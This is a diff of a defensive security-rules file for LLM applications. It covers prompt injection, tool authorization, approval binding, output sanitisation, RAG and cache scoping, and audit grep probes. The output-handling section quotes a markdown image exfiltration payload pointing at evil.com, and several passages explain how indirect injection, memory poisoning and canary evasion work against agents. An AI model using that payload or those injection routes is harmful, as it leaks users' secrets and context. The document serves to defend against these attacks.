@@ -27,7 +27,7 @@ code around it, never by the prompt itself.
   rules, or authorization decisions in the system prompt; assume full prompt
   disclosure (LLM07). Plant a unique canary string in each system prompt and
   alert when it appears in output, logs or anywhere outside (confirmed leak,
-  security-monitoring guidance and rules/05). The canary only detects a
+  security-monitoring guidance). The canary only detects a
   leak. It never makes a secret in the prompt acceptable. OWASP: LLMSVS 5.7, LLMSVS 8.2.
 - **The server owns the prompt.** The server builds the system prompt and assembles
   the full prompt; an LLM endpoint accepts the user's turn and nothing else — never a
@@ -35,7 +35,7 @@ code around it, never by the prompt itself.
   from the client. Accepting one lets every caller rewrite the instructions. Anonymous,
   trial and preview access to an LLM feature is still metered work: authenticate it,
   or give it its own quota with tighter limits than paid tiers (denial-of-wallet,
-  rules/06 §5). OWASP: LLMSVS 5.2, LLMSVS 5.17.
+  [rules/06](06-memory-resource-safety.md) §5). OWASP: LLMSVS 5.2, LLMSVS 5.17.
 - **Indirect injection** is the serious one: instructions embedded in content
   the model processes — web pages, emails, PDFs, code comments, calendar
   invites, RAG chunks, prior tool output. Any pipeline where the model reads
@@ -43,7 +43,7 @@ code around it, never by the prompt itself.
   is the attack path. Give an agent only the files and content its task needs,
   since everything else is extra injection surface. After it has processed
   content from outside contributors or public repositories, review its changes
-  and actions before accepting them (`sota-sandboxing` rules/05 §7). OWASP:
+  and actions before accepting them ([`sota-sandboxing` rules/05](../../sota-sandboxing/rules/05-ai-agent-sandboxing.md) §7). OWASP:
   Secure Coding with AI cheat sheet.
 - **Every modality carries instructions.** Text drawn into an image (tiny, low-contrast,
   off-canvas), spoken audio, video frames, document metadata (EXIF, PDF and Office
@@ -64,8 +64,9 @@ code around it, never by the prompt itself.
     content, downgrade what it may do (e.g. can no longer call
     send_email/exfiltrate-capable tools) — taint tracking at the orchestrator.
   - Prompt-injection classifiers/heuristics as telemetry and friction, not as
-    the security boundary. Tier them by cost. On every turn, run cheap checks:
-    normalise (rules/09 §4), collapse repeated whitespace and characters, cap
+    the security boundary — and evaluated per language before they are trusted at all
+    ([`sota-llm-engineering` rules/01](../../sota-llm-engineering/rules/01-evals.md) §1). Tier them by cost. On every turn, run cheap checks:
+    normalise ([rules/09](09-untrusted-data-ingestion.md) §4), collapse repeated whitespace and characters, cap
     length, decode Base64, hex and LaTeX-hidden text in remote content so the
     screen sees the payload, then fuzzy-match known phrases (a Levenshtein-class
     metric, threshold precomputed at startup, which catches scrambled-letter
@@ -94,7 +95,7 @@ code around it, never by the prompt itself.
     have measured its marginal recall *on the hard class specifically* — the
     inputs the primary gets wrong — rather than on a mixed corpus where easy
     cases dominate the mean. A layer that adds nothing on the class you care
-    about is a control that looks enabled and does nothing (rules/10 §1). The
+    about is a control that looks enabled and does nothing ([rules/10](10-silent-control-failure.md) §1). The
     same reasoning applies to any guard sharing a substrate with the guarded
     system: the same model family, the same tokenizer, the same training corpus,
     or the same normalization step that produced the miss.
@@ -127,12 +128,12 @@ def allowed_tools(session):
   user-scoped — one user's poisoned memory must never reach another's session.
 - Multi-agent systems: each hop is a trust boundary. Agent B must not treat
   agent A's output as instructions-with-A's-privileges; propagate taint and
-  the original human principal through the whole chain (rules/03 §6 deputy
+  the original human principal through the whole chain ([rules/03](03-authorization.md) §6 deputy
   rules apply between agents). Message-level controls: §1a.
 
 ### 1a. Inter-agent and agent-tool messages (ASI07)
 
-Whether multi-agent is worth its cost is `sota-llm-engineering` rules/04 §7; once you
+Whether multi-agent is worth its cost is [`sota-llm-engineering` rules/04](../../sota-llm-engineering/rules/04-agents-tools.md) §7; once you
 have it, every message between agents, and every tool response, is input from a peer
 whose compromise you must survive:
 
@@ -152,7 +153,7 @@ whose compromise you must survive:
   chain of agents behind it, and policy and approval read that field: an agent-initiated
   payment is not the same decision as one the user clicked.
 - **Write the delegation policy down.** Which agent may hand which task to which agent,
-  with scope shrinking at each hop (`sota-sandboxing` rules/05 R6.1). A delegation the
+  with scope shrinking at each hop ([`sota-sandboxing` rules/05](../../sota-sandboxing/rules/05-ai-agent-sandboxing.md) R6.1). A delegation the
   policy does not list is refused.
 
 OWASP: AISVS 9.5.5, AISVS 10.4.6, AI Agent Security cheat sheet, AML Sanctions AI Agent
@@ -164,15 +165,15 @@ Payments cheat sheet, DSOMM.
   call delete_user for admins" in a system prompt is not a control. The tool
   executor checks the *human principal's* permissions on every invocation —
   the model's request is an unauthenticated suggestion (confused deputy,
-  rules/03 §6: the agent is the deputy).
+  [rules/03](03-authorization.md) §6: the agent is the deputy).
 - Run tools with the **user's identity and scopes**, not a god-mode service
   account: propagate the *principal* (who the user is, their tenant, their
   scopes), not the bearer token they presented. An agent serving user A must
   be physically unable to read user B's data (tenant scoping at the data
-  layer, rules/03 §5).
+  layer, [rules/03](03-authorization.md) §5).
 - **No token passthrough.** Never forward the token the caller presented to a
   tool, an MCP server or a downstream API. Get a separate token for each
-  downstream audience — OAuth token exchange (RFC 8693, rules/03 §6) or an
+  downstream audience — OAuth token exchange (RFC 8693, [rules/03](03-authorization.md) §6) or an
   audience-restricted, down-scoped token. The MCP authorization spec (rev
   2026-07-28, Security Considerations; also in 2025-11-25) makes this normative: an MCP server must accept only tokens issued
   for itself (RFC 8707 audience) and "MUST NOT pass through the token it
@@ -182,9 +183,9 @@ Payments cheat sheet, DSOMM.
   model never supplies the customer_id); read-only by default, mutation tools
   separate and gated.
 - **Validate tool arguments like any untrusted input** — model output IS
-  untrusted input (rules/01 applies in full): schema-validate, then apply the
+  untrusted input ([rules/01](01-input-injection.md) applies in full): schema-validate, then apply the
   same SQLi/path traversal/SSRF/command-injection guards as for user input.
-  A `fetch_url` tool needs the complete SSRF defense from rules/01 §5.
+  A `fetch_url` tool needs the complete SSRF defense from [rules/01](01-input-injection.md) §5.
 - **Check what leaves through tool arguments.** The executor is an egress point:
   reject arguments carrying credential-shaped values (cloud key IDs, token
   prefixes, PEM blocks, JWTs), flag base64 or hex blobs packed into URL paths
@@ -193,7 +194,7 @@ Payments cheat sheet, DSOMM.
   server it came from and block, or send to approval, a value from server A
   (a credential above all) flowing into a call to server B. A gateway or proxy
   in front of every server is where that isolation is enforced; network egress
-  control is the backstop (`sota-sandboxing` rules/05 §4). OWASP: AI Agent
+  control is the backstop ([`sota-sandboxing` rules/05](../../sota-sandboxing/rules/05-ai-agent-sandboxing.md) §4). OWASP: AI Agent
   Security cheat sheet, MCP Security cheat sheet.
 - Human-in-the-loop for irreversible/high-impact actions (payments, deletes,
   external sends, code execution): explicit confirmation showing the *actual
@@ -201,8 +202,9 @@ Payments cheat sheet, DSOMM.
   "always allow" defeat the control — scope them narrowly.
 - **Bind the approval to what executes, and fail closed.** The approval record
   names the actor (agent), the requester (human principal), the tool, the
-  target, the *normalised* arguments, the context, a single-use nonce and an
-  expiry, and the approval service signs or MACs it. The executor recomputes
+  target, the *normalised* arguments (or their hash), the context, the approver's
+  identity, the reason, a timestamp, a single-use nonce and an expiry, and the
+  approval service signs or MACs it. The executor recomputes
   that binding from the call it is about to run and refuses on any difference,
   a reused nonce or an expired record: approving `transfer(10, to=A)` must not
   authorize `transfer(10000, to=B)`. The approver sees a risk level and a plain
@@ -211,15 +213,16 @@ Payments cheat sheet, DSOMM.
   tool registry, never from the model's account of the call, and in a chain the
   highest class of any step sets the gate. If approval validation, the policy
   lookup or the audit write errors or times out, the action does not run
-  (rules/03 §1). OWASP: AISVS 9.2.3, AISVS 9.2.8, AISVS 9.2.10, AI Agent
+  ([rules/03](03-authorization.md) §1), and **a pending approval nobody answers is a
+  denial** — dropped, never run by default. OWASP: AISVS 9.2.3, AISVS 9.2.8, AISVS 9.2.10, AISVS 9.6.2, AI Agent
   Security cheat sheet, AI-Powered Advertising Systems Security cheat sheet.
 - Rate-limit and budget-limit per session: max tool calls, max spend, max
-  loop iterations (agent loops are resource-exhaustion surfaces, rules/06 §5).
+  loop iterations (agent loops are resource-exhaustion surfaces, [rules/06](06-memory-resource-safety.md) §5).
 - Audit-log every tool invocation: principal, session, full arguments, result
   size, taint state — agent actions must be attributable and reconstructible.
   Bind each entry to the acting agent's identity and a per-request nonce, store
   sensitive arguments as a keyed hash (a bare hash of a guessable value is
-  reversible), and key-chain the entries (rules/18). A multi-hop transaction
+  reversible), and key-chain the entries ([rules/18](18-tamper-evident-logs.md)). A multi-hop transaction
   carries a receipt signed over its intent hash that each hop verifies, then
   appends to. OWASP: AISVS 9.4.2, AML Sanctions AI Agent Payments cheat sheet.
 - **A second opinion that fails differently.** For high-risk planned actions and
@@ -248,7 +251,7 @@ def execute_tool(call, session):
 
 - Model output is **untrusted, attacker-influenceable data**. Every sink needs
   the corresponding defense:
-  - Rendered in web UI → encode/sanitize like user content (rules/05 §1).
+  - Rendered in web UI → encode/sanitize like user content ([rules/05](05-web-security.md) §1).
     Rendering model markdown as HTML without sanitization is stored XSS;
     **markdown image/link URLs are an exfiltration channel**
     (`![](https://evil.com/?q=<secrets from context>)`) — proxy or strip
@@ -257,7 +260,7 @@ def execute_tool(call, session):
     by design: sandbox (no network, ephemeral FS, resource caps), review gates
     for anything persisted; never `eval` model output in the app process
     (CWE-94).
-  - Used in queries/commands/paths → parameterize/validate exactly as rules/01.
+  - Used in queries/commands/paths → parameterize/validate exactly as [rules/01](01-input-injection.md).
   - Fed to another model or template → injection chains; keep the data/
     instruction separation at every hop.
 ```python
@@ -293,7 +296,7 @@ run_in_sandbox(code,
   orchestrator, decisions come from code.
 - Content-safety/PII filters on output where the application demands it —
   applied post-generation in code, with the same redaction discipline as logs
-  (rules/07 §2): model responses must not echo secrets present in context
+  ([rules/07](07-data-exposure.md) §2): model responses must not echo secrets present in context
   (keys, other users' data) — best fixed by not putting them in context. Also
   flag a wrong response language, a length far outside the route's norm,
   high-entropy or encoded runs (exfiltration, canary evasion) and a reproduced
@@ -332,14 +335,14 @@ results = vstore.search(
   inverted approximately; protect vector stores like the source documents
   (encryption, access control, no public endpoints). An embedding endpoint that
   untrusted users or agents reach needs authentication, rate limits and quotas;
-  for high-risk corpora weigh calibrated noise (`sota-privacy-compliance` rules/02
+  for high-risk corpora weigh calibrated noise ([`sota-privacy-compliance` rules/02](../../sota-privacy-compliance/rules/02-privacy-by-design.md)
   §4). OWASP: RAG Security cheat sheet.
 - **Self-hosted vector DBs ship auth-OFF by default** (Qdrant, among others):
   set an API key / JWT, enable TLS, and bind to an internal-only network — an
   exposed keyless vector endpoint is full corpus read/write (poisoning + theft).
   Restrict *write* access to the ingestion pipeline identity only, and hash each
   ingested document (e.g. SHA-256) so tampered/poisoned chunks are detectable
-  and excludable at retrieval.
+  and excludable at retrieval. Auth, network, TLS and tenancy probes: database-engine guidance.
 - Cache keyed on prompts must be principal-scoped (semantic caches returning
   user A's answer — containing A's data — to user B).
 - **All serving-layer shared state is tenant-scoped, not only the response
@@ -359,6 +362,8 @@ Platform and supply-chain notes (formerly section 5) moved to [rules/23](23-llm-
 
 ## 6. Audit grep starters
 
+*(advisory)* — a pattern list feeding the §1–§4 checklist items; it states no rule of its own.
+
 ```text
 f-string/template building prompts from request data with no data/instruction framing
 tools=|functions=|tool_choice passed where context includes fetched/retrieved content
@@ -375,21 +380,20 @@ mcpServers|\.mcp\.json|claude_desktop_config entries without version pin or defi
 
 ## Audit checklist
 
-- [ ] Is there any path where third-party content (web, docs, email, RAG, tool results) reaches a model that holds tools or sensitive context — and if so, is it quarantined (no-tool call, taint-gated capabilities)?
-- [ ] Does the architecture avoid the lethal trifecta (private data + untrusted content + exfiltration channel) per agent, or gate one leg?
-- [ ] Are there zero secrets, credentials, or authorization rules living only in prompts?
-- [ ] Is every tool call authorized in code against the human principal's permissions, with session-bound scoping (tenant/user IDs never model-supplied)?
-- [ ] Are tool arguments schema-validated and passed through the full rules/01 input defenses (SSRF, path, SQL, command)?
-- [ ] Do irreversible/high-impact actions require human confirmation displaying actual parameters, with per-session call/spend/iteration budgets?
-- [ ] Is model output sanitized per sink — HTML-encoded/sanitized for UI, external markdown images blocked/proxied, never eval'd in-process, parameterized into queries?
-- [ ] Is structured model output strictly schema-parsed with rejection (no lenient repair)?
-- [ ] Does RAG retrieval enforce the caller's document ACLs/tenant in the store query, with provenance on chunks?
-- [ ] Are prompt/completion logs redacted, and semantic caches principal-scoped?
-- [ ] Is every tool invocation audit-logged with principal, arguments, and taint state?
-- [ ] Are agent memory writes gated, provenance-tagged, and strictly user-scoped (no cross-user persistence)?
-- [ ] In multi-agent chains, do taint and the human principal propagate across every hop?
-- [ ] Is model-generated code executed only in network-isolated, resource-capped, ephemeral sandboxes?
-- [ ] Are reasoning-token budgets capped per request with consumption-anomaly alerting (OverThink-class), and is untrusted content kept out of reasoning scaffolds (H-CoT/CoT hijacking)?
+- [ ] Is there any path where third-party content (web, docs, email, RAG, tool results) reaches a model that holds tools or sensitive context — and if so, is it quarantined (no-tool call, taint-gated capabilities) (§1)?
+- [ ] Does the architecture avoid the lethal trifecta (private data + untrusted content + exfiltration channel) per agent, or gate one leg (§1)?
+- [ ] Are there zero secrets, credentials, or authorization rules living only in prompts (§1)?
+- [ ] Is every tool call authorized in code against the human principal's permissions, with session-bound scoping (tenant/user IDs never model-supplied) (§2)?
+- [ ] Are tool arguments schema-validated (§2) and passed through the full [rules/01](01-input-injection.md) input defenses (SSRF, path, SQL, command)?
+- [ ] Do irreversible/high-impact actions require human confirmation displaying actual parameters, with per-session call/spend/iteration budgets (§2)?
+- [ ] Is model output sanitized per sink — HTML-encoded/sanitized for UI, external markdown images blocked/proxied, never eval'd in-process, parameterized into queries (§3)?
+- [ ] Is structured model output strictly schema-parsed with rejection (no lenient repair) (§3)?
+- [ ] Does RAG retrieval enforce the caller's document ACLs/tenant in the store query, with provenance on chunks (§4)?
+- [ ] Are prompt/completion logs redacted, and semantic caches principal-scoped (§4)?
+- [ ] Is every tool invocation audit-logged with principal, arguments, and taint state (§2)?
+- [ ] Are agent memory writes gated, provenance-tagged, and strictly user-scoped (no cross-user persistence) (§1)?
+- [ ] In multi-agent chains, do taint and the human principal propagate across every hop (§1)?
+- [ ] Is model-generated code executed only in network-isolated, resource-capped, ephemeral sandboxes (§3)?
 - [ ] Does every LLM endpoint build the system prompt and full prompt server-side, taking only the user turn from the client, and do anonymous/trial/preview paths carry auth or their own tighter quota (§1)? HIGH when a client-supplied `system` or `messages` reaches the model. Probe, reading each hit: `grep -rnE '(messages|system_?prompt|system)[[:space:]]*=[[:space:]]*(request|req|body|payload|params|data)[.[]' .`
 - [ ] Is text extracted from images, audio, video and document metadata (OCR, captions, transcripts, EXIF) framed and taint-gated like retrieved content, and are inputs screened jointly as well as singly (§1)? HIGH when the model holds tools. Probe for extracted text interpolated straight into a prompt: `grep -rniE '(\{|\+[[:space:]]*)[[:alnum:]_.]*(ocr|caption|transcript|exif|alt_?text)' .`
 - [ ] Do agents accept messages only from registered peers, over mutually authenticated channels, signed with recipient, timestamp and nonce, schema-validated with privileged fields stripped, under a written delegation policy (§1a)? HIGH when a peer can set a `system` role or approval flag. Probe for a role copied from a peer message: `grep -rnE 'role.?[[:space:]]*:[[:space:]]*[A-Za-z_][[:alnum:]_]*(\[|\.)' .`
@@ -398,4 +402,4 @@ mcpServers|\.mcp\.json|claude_desktop_config entries without version pin or defi
 - [ ] Is each approval bound (signed/MAC'd) to actor, requester, tool, target, normalised arguments, nonce and expiry and re-verified by the executor, with the impact class from trusted metadata, the chain's highest class governing, and approval/policy/audit errors failing closed (§2)? HIGH. Probe for blanket approval switches: `grep -rniE '(auto_?approve|always_?allow|approve_?all|skip_?(confirm|confirmation|approval))[[:space:]]*[:=][[:space:]]*(true|yes|1)' .`
 - [ ] Are KV/prefix caches, plan caches, adapter pools and vector IDs tenant-scoped, is restricted/PII output kept out of shared caches, and do cache hits pass the same ACL check and audit as fresh retrievals (§4)? HIGH on a cross-tenant cache. Probe for cache keys built from the prompt alone: `grep -rnE 'cache_?key[[:space:]]*=[[:space:]]*[[:alnum:]_.]*\((prompt|query|messages)[^,]*$' .`
 - [ ] Is streamed model output sanitized and image/link-proxied while it streams, with incomplete constructs held back or the whole buffer re-sanitized per chunk (§3)? HIGH when the chat UI renders markdown. Probe for raw chunks appended to the DOM: `grep -rnE 'innerHTML[[:space:]]*\+=|insertAdjacentHTML[[:space:]]*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' --include='*.vue' .` (read each hit; it is a finding when the appended value is a model chunk).
-- [ ] Is any classifier/judge/"second opinion" tier counted as a defence layer in the threat model **from the same model family** as the system it guards — without a measured marginal recall on the hard class (the inputs the primary gets wrong)? Common-cause failure; an escalate-only tier is bounded by the primary's uncertainty coverage and cannot see a confidently-wrong score.
+- [ ] Is any classifier/judge/"second opinion" tier counted as a defence layer in the threat model (§1) **from the same model family** as the system it guards — without a measured marginal recall on the hard class (the inputs the primary gets wrong)? Common-cause failure; an escalate-only tier is bounded by the primary's uncertainty coverage and cannot see a confidently-wrong score.
